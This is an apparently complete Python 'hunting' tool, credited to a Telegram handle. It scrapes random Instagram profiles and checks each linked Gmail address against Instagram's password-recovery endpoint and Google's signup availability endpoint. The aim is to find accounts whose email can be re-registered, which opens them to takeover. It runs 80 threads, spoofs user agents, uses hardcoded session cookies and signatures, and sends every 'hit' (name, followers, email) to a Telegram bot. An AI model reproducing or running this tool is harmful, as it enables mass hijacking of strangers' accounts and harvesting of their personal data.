import requests
import time
import random
import json, string
from threading import Thread
import os
from user_agent import *
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import re
import hashlib
import uuid
from requests import get
import sys
from datetime import datetime
import webbrowser



try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    try:
        from cfonts import render, say
    except:
        render = lambda text, **k: text


def welcome_screen():
    # ألوان جهنمية
    G = "\033[1;32m"      # أخضر - لون الشيطان
    BKG = "\033[40m"      # خلفية سوداء - الظلام الحالك
    W = "\033[1;37m"      # أبيض - لون الخيانة
    R = "\033[1;31m"      # أحمر - لون الدم
    RESET = "\033[0m"

    try:
        banner = render("WEB", colors=['red', 'black'], align='center') 
        print(banner)
    except:
        print(f"""
  
  ___    _   _    __     ___    _   _  
 / __|  | | | |   \ \   / / \   | | | | 
| |__   | |_| |    \ \ / / _ \  | |_| | 
 \___|   \___/      \_/ /_/ \_\  \___/  

""")

    def matrix_rain(lines=12, width=64, delay=0.02):
        chars = "01"
        for _ in range(lines):
            line = "".join(random.choice(chars) for _ in range(width))
            print(f"{R}{line}{RESET}") 
            time.sleep(delay)

    
    def fire_loading(text, loops=9):
        flames = ["🔥", "👿", "😈", "🔥", "👿", "😈", "🔥", "👿", "😈"] 
        for i in range(loops):
            sys.stdout.write(f"\r{R}{text} {flames[i % len(flames)]}{RESET}")  # استخدم الأحمر
            sys.stdout.flush()
            time.sleep(0.18)
        print()

    os.system("clear" if os.name == "posix" else "cls")

# ألوان جهنمية جديدة
c1 = '\x1b[38;5;120m'  # لون شيطاني
j21 = '\x1b[38;5;204m'  # لون سام
p1 = '\x1b[38;5;150m'  # لون شرير
cyan = "\033[1m\033[36m"
x = '\x1b[1;33m'
white = '\x1b[1;37m'
z = '\x1b[1;31m'  # أحمر - رمز للدماء
bi = random.randint(5, 208)
ror1 = f'\x1b[38;5;{bi}m'
memo = random.randint(100, 300)
ror = f'\x1b[38;5;{memo}m'

# دالة قوس قزح - لتلوين كلمات الكراهية
r = "\033[31m"  # أحمر - الكراهية
o = "\033[33m"  # برتقالي - الغضب
y = "\033[93m"  # أصفر - الخداع
g = "\033[32m"  # أخضر - الخداع
b = "\033[34m"  # أزرق - الموت
p = "\033[35m"  # بنفسجي - العذاب
reset = "\033[0m"

def rainbow(text):
    colors = [r, o, y, g, b, p]
    result = ""
    for i, char in enumerate(text):
        result += colors[i % len(colors)] + char
    return result + reset

# عرض معلومات عن الهجوم
print(('—' * 25) + '\ntelegram :- @l9irch_13x1 _ @l9irch_13x1_01 •\n' + ('—' * 25))
print(f"""\

  
     ___    _   _    __     ___    _   _  
 / __|  | | | |   \ \   / / \   | | | | 
| |__   | |_| |    \ \ / / _ \  | |_| | 
 \___|   \___/      \_/ /_/ \_\  \___/  


""")
print(('—' * 25) + '\ntelegram :- @l9irch_13x1 _ @l9irch_13x1_01 •\n' + ('—' * 25))


token = input(rainbow("TOKEN: "))
print("")
ID = input(rainbow("ID : "))
os.system('clear')


total = 0
hits = 0
bad_gm = 0
bad_mail = 0
goodig = 0
infoinsta = {}
import requests
yy = 'azertyuiopmlkjhgfdsqwxcvbn'


print(rainbow("\nFishing options:"))
print("1. (2012)")
print("2. (2013)")
print("3. (2014)")
print("4. (2015)")
print("5.  (1__5)")
choice = input(rainbow("Choose an option (1-5): "))
target_year = None
if choice in ["1", "2", "3", "4"]:
    target_year = 2011 + int(choice)  


def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(e)
        tll()
tll()


def check_gmail(email):
    global bad_mail, hits
    try:
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            o = open('tl.txt', 'r').read().splitlines()[0]

        tl, host = o.split('//')

        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}',
            'user-agent': ggb(),
        }

        params = {'TL': tl}
        data = (
            'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        if '"gf.uar",1' in str(response.text):
            hits += 1
            pppp()
            if '@' not in email:
                ok = email + '@gmail.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else:
            bad_mail += 1
            pppp()
    except:
        pass
#Telegram :- @l9irch_13x1 $ @l9irch_13x1 •

def check(email):
    global goodig, bad_gm
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ua,
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'adid': uui,
            'guid': uui,
            'device_id': device_id,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
    if email in response:
        if '@gmail.com' in email:
            check_gmail(email)
        goodig += 1
        pppp()
    else:
        bad_gm += 1
        pppp()


def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019)
        ]

        if target_year:  # إذا تم تحديد سنة هدف
            for upper, year in ranges:
                if year == target_year and hy <= upper:
                    return year
            return target_year  # إرجاع سنة الهدف في حالة عدم العثور عليها
        else:  # إذا لم يتم تحديد سنة هدف (صيد عشوائي)
            for upper, year in ranges:
                if hy <= upper:
                    return year
            return 2023
    except Exception:
        pass


def InfoAcc(username, gg):
    global total
    rr = infoinsta.get(username, {})
    Id = rr.get('pk', None)
    full_name = rr.get('full_name', None)
    fows = rr.get('follower_count', None)
    fowg = rr.get('following_count', None)
    pp = rr.get('media_count', None)
    isPraise = rr.get('is_private', None)
    bio = rr.get('biography', None)
    is_verified = rr.get('is_verified', None)
    try:
        hy = int(Id) if Id != 'none' else None
        datte = date(hy) if hy else 'none'
    except:
        datte = 'none'

    total += 1
    
    ss = f'''تم صيد حساب Instagram  
     ===================
    ♕ - NAME :   {full_name}
    ♕ - Follomers:   {fows}
    ♕ - Folloing: {fowg}
    ♕ - DATA : {datte}
    ♕ - EMAIL :  {username}@{gg}
    ♕ - USERNAME :  ttps://.instagram.com/{username}
    ===================
    py : @l9irch_13x1
    '''
#https://t.me/l9irch_13x1
    print(ss)
    with open('WEB.txt', 'a') as ff:
        ff.write(f'{ss}\n')

    try:
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ss}")
        except:
            pass
    except Exception as e:
        pass

def pppp():
    """عرض الحالة الحية أثناء الفحص - تم تعديلها لتناسب أهدافنا الشريرة"""
    true_color = '\033[1;32m'    # أخضر - النجاح، لكنه خداع!
    false_color = '\033[1;31m'   # أحمر - الفشل، لكنه يعني المزيد من الدمار!
    bad_color = '\033[1;33m'     # أصفر - التحذير، يعني أننا على الطريق الصحيح!
    reset = '\033[0m'
    deco = '@l9irch_13x1'  # زخرفة شيطانية

    sys.stdout.write(f'''\r{deco} {true_color}Hits : [{hits}]{reset} ~ {false_color}False : [{bad_gm}]{reset} ~ {bad_color}Bad Email : [{bad_mail}]{reset} {deco} \r''')
    sys.stdout.flush()
#https://t.me/l9irch_13x1_01

def gg():
    """جلب حسابات إنستغرام وفحصها - مع التركيز على سنة الإنشاء"""
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({
                "id": int(random.randrange(2500000000, 21254029834)),
                "render_surface": "PROFILE"
            }),
            "doc_id": "25618261841150840"
        }

        try:
            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers={"X-FB-LSD": data["lsd"]},
                data=data
            )
            user_data = response.json().get('data', {}).get('user', {})
            username = user_data.get('username')
            if username:
                infoinsta[username] = user_data
                emails = [username + '@gmail.com']

                
                if target_year is None or (date(int(user_data.get('pk', 0))) == target_year):
                    for email in emails:
                        check(email)
                

        except Exception:
            pass


def start_threads(num_threads=80):
    for _ in range(num_threads):
        Thread(target=gg, daemon=True).start()


if __name__ == "__main__":
    start_threads(80)

    try:
        while True:
            pppp()
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\nتم إيقاف العملية - إلى اللقاء، أعدائي!")
